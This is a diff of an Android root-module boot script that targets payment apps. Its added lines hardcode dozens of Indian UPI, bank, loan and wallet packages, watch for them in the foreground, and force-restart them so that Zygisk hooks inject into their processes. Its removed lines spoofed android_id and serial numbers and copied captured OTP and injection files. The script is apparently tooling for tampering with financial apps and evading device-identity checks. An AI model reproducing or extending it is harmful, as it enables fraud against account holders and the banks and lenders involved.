@@ -1,60 +1,135 @@
 #!/system/bin/sh
-# Runs after boot — sync runtime config + device ID change watcher
+# Zygisk-only runtime — auto UPI detect, config sync, hook restart (no APK)
 
 MODDIR=${0%/*}
 CONFIG="$MODDIR/config.json"
 RUNTIME="/data/local/tmp/hivirtus_zygisk_mode_config.json"
-DEVICE_CMD="/data/local/tmp/hivirtus_change_device_id.cmd"
-INJECT_RUNTIME="/data/local/tmp/hivirtus_inject.cmd"
-APP_DIR="/sdcard/Android/data/com.hivirtus.zygiskmode/files"
-APP_CONFIG="$APP_DIR/hivirtus_zygisk_mode_config.json"
-APP_INJECT="$APP_DIR/hivirtus_inject.cmd"
-APP_OTP="$APP_DIR/hivirtus_last_otp.json"
+ACTIVE_PKG="/data/local/tmp/hivirtus_active_hook_pkg.txt"
+RESTART_FLAG="/data/local/tmp/hivirtus_restart_upi.flag"
 
-sync_app_config() {
-  if [ -f "$APP_CONFIG" ]; then
-    cp -f "$APP_CONFIG" "$RUNTIME"
-    cp -f "$APP_CONFIG" "$CONFIG"
+# Built-in UPI / loan packages (match native upi_registry.cpp)
+UPI_PACKAGES="
+com.phonepe.app
+net.one97.paytm
+com.google.android.apps.nbu.paisa.user
+com.yespay.next
+com.yesbank.yespay
+com.snapmint.customerapp
+com.tataneu
+com.stashfin.android
+com.kreditbee.android
+com.dreamplug.androidapp
+com.mobikwik_new
+com.freecharge.android
+in.org.npci.upiapp
+com.amazon.mShop.android.shopping
+com.popclub.android
+com.myairtelapp
+com.jio.myjio
+com.csam.icici.bank.imobile
+com.sbi.lotusintouch
+com.axis.mobile
+com.hdfcbank.payzapp
+com.bankofbaroda.mpassbook
+com.idfcfirstbank.mobile
+com.kotak811mobilebankingapp
+com.whizdm.moneyview.loans
+com.naviapp
+com.bharatpe.app
+com.rapipay
+com.fampay.in
+com.slice.app
+com.postpe.app
+com.olacabs.customer
+com.application.zomato
+in.swiggy.android
+com.meesho.supply
+com.flipkart.android
+com.lazypay.app
+com.earlysalary.android
+com.whiz.credit
+com.zestmoney.android
+com.payu.india
+com.msf.angelmobile
+com.groww.app
+com.mmt.mmtpay
+com.irctc.air
+com.truecaller
+com.whatsapp
+com.samsung.android.spay
+com.navi.moneymanager
+com.loan.front
+com.buddyloan.app
+com.rupilo.android
+com.moneytap.app
+com.paysense.android
+com.branch_international.branch.branch_demo_android
+com.cashfree
+com.razorpay.payments
+com.mpokket.app
+com.cashe.android
+com.rupeeredee.app
+com.loan.tap
+com.smartcoin
+com.kissht.android
+com.flexsalary
+com.nira.finance
+com.availfinance
+com.indialends.android
+com.homecredit
+com.bajajfinserv
+com.hdbfs.hdbfsl
+in.medibuddy
+"
+
+is_upi_pkg() {
+  echo "$UPI_PACKAGES" | grep -qx "$1"
+}
+
+sync_config() {
+  if [ -f "$CONFIG" ]; then
+    cp -f "$CONFIG" "$RUNTIME"
     chmod 644 "$RUNTIME" 2>/dev/null
-    chmod 644 "$CONFIG" 2>/dev/null
-  fi
-  if [ -f "$APP_INJECT" ]; then
-    cp -f "$APP_INJECT" "$INJECT_RUNTIME"
-    chmod 644 "$INJECT_RUNTIME" 2>/dev/null
-  fi
-  if [ -f "$APP_OTP" ]; then
-    cp -f "$APP_OTP" "/data/local/tmp/hivirtus_last_otp.json"
-    chmod 644 "/data/local/tmp/hivirtus_last_otp.json" 2>/dev/null
   fi
 }
 
-apply_device_id() {
-  [ -f "$DEVICE_CMD" ] || return 0
-  NEW_ID=$(grep -o 'CHANGE_ID|.*' "$DEVICE_CMD" 2>/dev/null | cut -d'|' -f2 | tr -d '[:space:]')
-  rm -f "$DEVICE_CMD"
-  [ -n "$NEW_ID" ] || return 0
-
-  settings put secure android_id "$NEW_ID" 2>/dev/null
-  resetprop ro.serialno "$NEW_ID" 2>/dev/null
-  resetprop ro.boot.serialno "$NEW_ID" 2>/dev/null
-  echo "$NEW_ID" > /data/local/tmp/hivirtus_spoof_android_id.txt
-  chmod 644 /data/local/tmp/hivirtus_spoof_android_id.txt 2>/dev/null
+get_foreground_pkg() {
+  dumpsys activity activities 2>/dev/null | grep mResumedActivity | head -n1 | sed -n 's/.* \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p'
 }
 
-sync_app_config
+mark_active() {
+  echo "$1" > "$ACTIVE_PKG"
+  chmod 644 "$ACTIVE_PKG" 2>/dev/null
+  date +%s > /data/local/tmp/hivirtus_module_heartbeat.txt
+}
 
-if [ -f "$CONFIG" ] && [ ! -f "$RUNTIME" ]; then
-  cp -f "$CONFIG" "$RUNTIME"
-  chmod 644 "$RUNTIME"
-fi
+notify_hook() {
+  pkg="$1"
+  # Heads-up style notification via cmd (Android 9+)
+  cmd notification post -t "Virtus Zygisk" "hivirtus_hook" "Hook active: $pkg" 2>/dev/null || true
+}
 
-apply_device_id
+sync_config
 
-# Live watcher — overlay saves + device ID cmd
 (
+  LAST=""
   while true; do
-    sync_app_config
-    apply_device_id
+    sync_config
+    FG=$(get_foreground_pkg)
+    if [ -n "$FG" ] && is_upi_pkg "$FG"; then
+      if [ "$FG" != "$LAST" ]; then
+        mark_active "$FG"
+        notify_hook "$FG"
+        # First open after boot — restart app so Zygisk hooks load in process
+        if [ ! -f "$RESTART_FLAG/$FG" ]; then
+          mkdir -p "$RESTART_FLAG" 2>/dev/null
+          touch "$RESTART_FLAG/$FG" 2>/dev/null
+          am force-stop "$FG" 2>/dev/null
+          monkey -p "$FG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
+        fi
+        LAST="$FG"
+      fi
+    fi
     sleep 2
   done
 ) &
